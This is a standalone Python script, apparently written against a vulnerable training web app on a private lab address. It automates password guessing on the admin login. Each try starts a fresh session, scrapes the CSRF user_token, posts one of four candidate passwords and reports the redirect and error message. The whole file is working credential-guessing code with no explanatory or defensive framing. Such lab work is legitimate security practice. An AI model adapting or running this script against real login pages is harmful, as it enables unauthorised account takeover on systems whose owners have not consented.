import sys, urllib.request, urllib.parse, re

BASE = "http://10.31.0.87:3000"

def new_session():
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None
    op = urllib.request.build_opener(NoRedirect)
    pg = op.open(BASE + "/login.php", timeout=15)
    setcookie = pg.headers.get_all("Set-Cookie") or []
    body_html = pg.read().decode()
    tok = re.search(r"user_token' value='([0-9a-f]+)'", body_html).group(1)
    cookies = {}
    for c in setcookie:
        k, v = c.split(";")[0].split("=", 1)
        if k == "PHPSESSID":
            cookies["PHPSESSID"] = v
        else:
            cookies.setdefault(k, v)
    ck = "; ".join("%s=%s" % kv for kv in cookies.items())
    return op, ck, tok

def do_login(ck, tok, user, pw):
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None
    op = urllib.request.build_opener(NoRedirect)
    data = urllib.parse.urlencode({"username": user, "password": pw, "Login": "Login", "user_token": tok}).encode()
    req = urllib.request.Request(BASE + "/login.php", data=data, method="POST")
    req.add_header("Cookie", ck)
    req.add_header("User-Agent", "Mozilla/5.0")
    try:
        r = op.open(req, timeout=15)
        loc = "(none)"
        body2 = ""
    except urllib.error.HTTPError as exc:
        loc = exc.headers.get("Location")
        body2 = exc.read().decode("utf-8", "replace")
    # follow if we land back on login.php and see the failure message
    if loc and "login.php" in str(loc):
        op3 = urllib.request.build_opener()
        req2 = urllib.request.Request(BASE + "/" + "login.php")
        req2.add_header("Cookie", ck)
        b3 = op3.open(req2, timeout=15).read().decode("utf-8", "replace")
        m = re.search(r"<div class=\"message\">(.*?)</div>", b3, re.S)
        hint = m.group(1).strip() if m else "(no message div)"
    else:
        hint = ""
    sys.stdout.write("%s/%s => loc=%s msg=%s\n" % (user, pw, loc, hint))

if __name__ == "__main__":
    op, ck, tok = new_session()
    for pw in ["password", "captchapwn1", "pwned1", "password123"]:
        op, ck, tok = new_session()
        do_login(ck, tok, "admin", pw)
